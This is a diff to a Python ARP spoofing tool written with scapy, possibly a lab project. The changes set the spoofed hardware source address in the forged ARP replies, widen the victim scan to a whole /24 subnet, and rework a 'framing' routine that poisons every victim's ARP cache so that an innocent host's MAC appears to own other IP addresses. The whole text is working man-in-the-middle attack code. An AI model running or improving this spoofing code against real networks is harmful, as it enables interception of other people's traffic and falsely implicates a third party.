@@ -54,10 +54,13 @@ def get_mac(ip):
 
  
 #send to target_ip that given mac is spoof_ip
-def arp_spoof(target_ip, spoof_ip, mac=ATTACKER_MAC): 
+def arp_spoof(target_ip, spoof_ip, mac): 
     """"Create and send ARP packet"""
+    if mac is None:
+        mac = ATTACKER_MAC
+
     arp = scapy.ARP(op=2, pdst=target_ip,
-                       hwdst=get_mac(target_ip), psrc=spoof_ip)
+                       hwdst=get_mac(target_ip), psrc=spoof_ip, hwsrc=mac)
     ether = scapy.Ether(src=mac)
     packet = ether/arp
     scapy.sendp(packet, verbose=False, iface=IFACE)
@@ -115,7 +118,7 @@ def arp_prep_automated(router_ip_, iface_ = "enp0s10") :
     else:
         router_ip = router_ip_
 
-    for i in range(1,10) :  # ips in subnet, should be (1, 255)
+    for i in range(1,255) :  # ips in subnet, should be (1, 255)
         ip = subnet + "." + str(i)
         try :
             victim_addresses[ip] = get_mac(ip) #exists
@@ -124,8 +127,7 @@ def arp_prep_automated(router_ip_, iface_ = "enp0s10") :
 
     if ATTACKER_IP in victim_addresses:
         del victim_addresses[ATTACKER_IP]
-    
-    
+
     print("Victims: ", str(victim_addresses))
 
 arp_scouting_thread = None
@@ -174,7 +176,7 @@ def arp_scout_callback(packet):
             if loud_framing :
                 for victim_ip in victim_addresses.keys():
                     if not victim_ip == router_ip:
-                        arp_spoof(victim_ip, ATTACKER_IP)
+                        arp_frame(victim_ip)
 
         #do not answer immediatly after router does (when victim broadcasts)
         if not dst_mac == ATTACKER_MAC:
@@ -210,7 +212,7 @@ def arp_loop():
 
 def arp_frame(ip): #have framed_mac claim that they are the given ip
     for victim in victim_addresses.keys() :
-        if not victim == router_ip :
-            arp_spoof(victim, ip, framed_mac)
+        arp_spoof(victim, ip, framed_mac)
+            
 
 
